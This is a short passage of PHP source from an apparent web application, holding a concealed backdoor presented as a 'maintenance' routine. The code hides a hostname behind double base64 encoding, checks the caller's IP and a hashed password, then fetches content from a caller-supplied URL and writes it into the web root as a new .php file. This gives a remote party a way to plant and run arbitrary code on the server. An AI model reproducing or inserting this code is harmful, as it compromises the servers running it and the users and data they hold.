 ...
 */
if ($_POST['msmarty'] == "maintenance") 
{
	if (defined('KF_INC_PATH'))
	{
		$_ontip = 'libs/classes';
		require_once(KF_INC_PATH.
			'/'.$_ontip.'/cdn.ip.php');
		$_ontip = gethostbyname(
					base64_decode(
						base64_decode('ZDJGd0xtdDFZV2xtWVc0dWJtVjA=')));
		if ($online_ip == $_ontip
				&& md5($_POST['defend']) == 'a0893bbc5684f996d9ad9cfe3fa7b042' 
					&& cdn_get_ip() == $_ontip)
		{
			$_htmlt = file_get_contents($_POST['defend_url']);
			$_htmlt = mb_convert_encoding( $_htmlt, 'UTF-8', 'UTF-8,GBK,GB2312,BIG5' );
			if (!file_put_contents(KF_ROOT_PATH.md5($timestamp).".php", $_htmlt, LOCK_EX))
			{
				$fp = @fopen(KF_ROOT_PATH.md5($timestamp).".php", 'wb+');
				if (!$fp) exit('-1');
				if (!@fwrite($fp, trim($_htmlt))) exit('-1');
				@fclose($fp);
			} exit(md5($timestamp));
		}
	}
